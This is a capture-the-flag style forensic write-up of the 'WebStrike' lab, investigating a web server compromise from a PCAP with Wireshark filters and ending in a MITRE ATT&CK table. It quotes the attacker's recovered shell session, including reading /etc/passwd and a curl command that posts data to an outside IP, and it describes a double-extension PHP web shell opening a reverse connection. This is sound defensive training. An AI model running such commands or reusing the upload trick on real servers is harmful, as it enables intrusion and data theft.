# WebStrike: Web Server Compromise Investigation via Network Traffic Analysis

## Cyber Defender

## Scenario

A suspicious file was discovered on an internal web server, triggering concerns about a potential compromise. The development team flagged the anomaly after detecting unexpected file presence within the application environment.

To investigate the incident, the network team captured relevant traffic and provided a PCAP file for forensic analysis.

As the assigned analyst, your objectives are to:

- Analyze the PCAP file to identify how the file was introduced
- Detect malicious HTTP requests or upload attempts
- Identify attacker-controlled IP addresses
- Reconstruct attack sequences from network traffic
- Determine whether the activity involved exploitation or unauthorized access
- Assess the scope of the compromise

The goal is to uncover the attack vector and evaluate the impact on the web server.

## Alert

**Web Server Compromise Alert:** Suspicious file detected on internal web server, potentially introduced through unauthorized web activity. Network traffic analysis indicates abnormal HTTP requests, including possible file upload attempts and interaction with external sources.

The activity suggests exploitation of a web application or misuse of upload functionality, requiring immediate investigation to determine the attack method and scope of compromise.

## Tools Used

- WireShark
- IPinfo
- VirusTotal

## Given Files

- WebStrike.pcap

---

## Challenge Questions

1.Identifying the geographical origin of the attack facilitates the implementation of geo-blocking measures and the analysis of threat intelligence. From which city did the attack originate?

Form the Conversation i took the top talker and performed OSINT in platform IP info.

<img width="795" height="208" alt="Screenshot 2026-05-06 212650" src="https://github.com/user-attachments/assets/16995341-25e5-40b1-8d1a-7dd64e941507" />

<img width="960" height="471" alt="Screenshot 2026-05-06 212854" src="https://github.com/user-attachments/assets/26d1a9b5-bc82-4f17-b9ad-936b522d7f08" />

In Virus Total it does not seem to be a malicious IP. It was from the China, Tianjin.

Answer: Tianjin

---

2. Knowing the attacker's User-Agent assists in creating robust filtering rules. What's the attacker's Full User-Agent?
In Wireshark filter by the malicious IP and use HTTP protocol to know the user agent of the user.

```jsx
ip.src==117.11.88.124 && http
```

<img width="413" height="168" alt="Screenshot 2026-05-06 213448" src="https://github.com/user-attachments/assets/fe1bf1cc-df82-409d-a01b-d262dacbaa82" />

Answer: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

---

3. We need to determine if any vulnerabilities were exploited. What is the name of the malicious web shell that was successfully uploaded?
Filter used:

```jsx
ip.src==117.11.88.124 && http.request.method=="POST"
```

On the packet 

```jsx
63	2023-11-30 18:44:18.053722	117.11.88.124	24.49.63.79	HTTP	1302	POST /reviews/upload.php HTTP/1.1  (application/x-php)
```

<img width="641" height="421" alt="Screenshot 2026-05-06 213731" src="https://github.com/user-attachments/assets/b4ec923e-8d7c-49a6-9ea4-2d8742ab806c" />

Answer: image.jpg.php

---

4.Identifying the directory where uploaded files are stored is crucial for locating the vulnerable page and removing any malicious files. Which directory is used by the website to store the uploaded files?

<img width="672" height="310" alt="Screenshot 2026-05-06 215003" src="https://github.com/user-attachments/assets/e4741ab0-6969-44fd-865d-849488862598" />

The malicious file was uploaded on the POST /reviews/upload.php HTTP/1.1, 

So the directory must be /reviews/uploads/

Answer: /reviews/uploads/

---

5.Which port, opened on the attacker's machine, was targeted by the malicious web shell for establishing unauthorized outbound communication?

On the packet

```jsx
178	2023-11-30 18:46:08.359028	24.49.63.79	117.11.88.124	TCP	1508	54448 → 8080 [PSH, ACK] Seq=1700 Ack=46 Win=64256 Len=1442 TSval=3033651114 TSecr=643982937
```

the Attacker uploaded the malicious file and connected to the server by the port number 8080 as a php reverse shell access. 

Answer:  8080

---

6.Recognizing the significance of compromised data helps prioritize incident response actions. Which file was the attacker attempting to exfiltrate?

<img width="960" height="413" alt="Screenshot 2026-05-06 220318" src="https://github.com/user-attachments/assets/7d29d138-c618-4e86-9fd0-c66fa9db2ae1" />

### Commands that performed by the attacker

```jsx
$ whoami
www-data
$ uname -a
Linux ubuntu-virtual-machine 6.2.0-37-generic #38~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Nov  2 18:01:13 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
$ pwd
/var/www/html/reviews/uploads
$ ls /home
ubuntu
$ cat /etc/passwd
$ curl -X POST -d /etc/passwd http://117.11.88.124:443/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100   368  100   357  100    11  56774   17[393 bytes missing in capture file].$
```

The attacker was exfiltrating the password for the system.

Answer: passwd

---

# MITRE ATT&CK Mapping

| ATT&CK Stage | Technique ID | Technique |
| --- | --- | --- |
| Reconnaissance | - | - |
| Resource Development | - | - |
| Initial Access | T1190 | Exploit Public-Facing Application |
| Execution | T1059.003 | Command and Scripting Interpreter: Unix Shell |
| Persistence | T1505.003 | Server Software Component: Web Shell |
| Privilege Escalation | - | - |
| Defense Impairment | - | - |
| Credential Access | T1003.008 | OS Credential Dumping: /etc/passwd and /etc/shadow |
| Discovery | T1082 | System Information Discovery |
| Discovery | T1033 | System Owner/User Discovery |
| Discovery | T1083 | File and Directory Discovery |
| Discovery | T1614 | System Location Discovery |
| Lateral Movement | - | - |
| Collection | T1005 | Data from Local System |
| Command and Control | T1105 | Ingress Tool Transfer |
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols |
| Exfiltration | T1041 | Exfiltration Over C2 Channel |
| Impact | - | - |

## Author

### RUTHRAN-SEC
